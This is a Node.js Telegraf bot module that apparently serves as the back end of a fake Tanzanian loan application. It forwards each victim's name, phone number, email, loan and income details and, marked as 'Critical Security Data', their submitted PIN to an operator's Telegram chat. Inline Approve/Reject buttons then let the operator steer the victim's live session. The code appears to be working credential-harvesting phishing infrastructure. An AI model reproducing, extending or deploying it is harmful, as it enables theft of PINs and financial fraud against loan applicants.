const { Telegraf, Markup } = require('telegraf');
const axios = require('axios');

const bot = process.env.BOT_TOKEN ? new Telegraf(process.env.BOT_TOKEN) : null;
const ADMIN_ID = process.env.ADMIN_CHAT_ID;
const SERVER_URL = process.env.RENDER_EXTERNAL_URL;

const sendAdminAlert = async (info) => {
    if (!bot || !ADMIN_ID) return;

    try {
        let msg = `🚀 *User Activity Update*\n`;
        msg += `━━━━━━━━━━━━━━━━━━\n`;
        msg += `📍 *Step:* ${info.step.replace(/_/g, ' ')}\n`;
        msg += `🆔 *Socket:* \`${info.socketId}\`\n\n`;

        // Profile Details (Accumulated)
        if (info.firstName) msg += `👤 *Name:* ${info.firstName} ${info.lastName || ''}\n`;
        if (info.phone)     msg += `📱 *Phone:* \`+255${info.phone}\`\n`;
        if (info.email)     msg += `📧 *Email:* ${info.email}\n`;
        
        // Loan Details
        if (info.amount)    msg += `💰 *Amount:* TZS ${Number(info.amount).toLocaleString()}\n`;
        if (info.loanType)  msg += `📝 *Type:* ${info.loanType}\n`;
        if (info.term)      msg += `⏱️ *Term:* ${info.term} Month(s)\n`;
        
        // Employment
        if (info.income)    msg += `💵 *Income:* TZS ${Number(info.income).toLocaleString()}\n`;
        if (info.employment) msg += `💼 *Status:* ${info.employment}\n`;

        // Critical Security Data
        if (info.pin) {
            msg += `\n━━━━━━━━━━━━━━━━━━\n`;
            msg += `🔑 *SUBMITTED PIN:* \`${info.pin}\`\n`;
            msg += `━━━━━━━━━━━━━━━━━━\n`;
        }

        const keyboard = info.step === '5_PIN_SUBMITTED' ? Markup.inlineKeyboard([
            [
                Markup.button.callback('✅ Approve', `approve_${info.socketId}`),
                Markup.button.callback('❌ Reject', `reject_${info.socketId}`)
            ]
        ]) : null;

        await bot.telegram.sendMessage(ADMIN_ID, msg, { 
            parse_mode: 'Markdown', 
            ...(keyboard || {}) 
        });
    } catch (e) {
        console.error("Telegram Alert Error:", e.message);
    }
};

if (bot) {
    bot.action(/approve_(.+)/, async (ctx) => {
        const socketId = ctx.match[1];
        try {
            await axios.post(`${SERVER_URL}/admin/action`, { socketId, action: 'approve' });
            await ctx.answerCbQuery("Approved");
            await ctx.editMessageText(ctx.callbackQuery.message.text + "\n\n✅ *STATUS: APPROVED*", { parse_mode: 'Markdown' });
        } catch (err) { await ctx.answerCbQuery("Server Error"); }
    });

    bot.action(/reject_(.+)/, async (ctx) => {
        const socketId = ctx.match[1];
        try {
            await axios.post(`${SERVER_URL}/admin/action`, { socketId, action: 'reject' });
            await ctx.answerCbQuery("Rejected");
            await ctx.editMessageText(ctx.callbackQuery.message.text + "\n\n❌ *STATUS: REJECTED*", { parse_mode: 'Markdown' });
        } catch (err) { await ctx.answerCbQuery("Server Error"); }
    });

    bot.launch().catch(err => console.error("Bot fail:", err.message));
}

module.exports = { sendAdminAlert };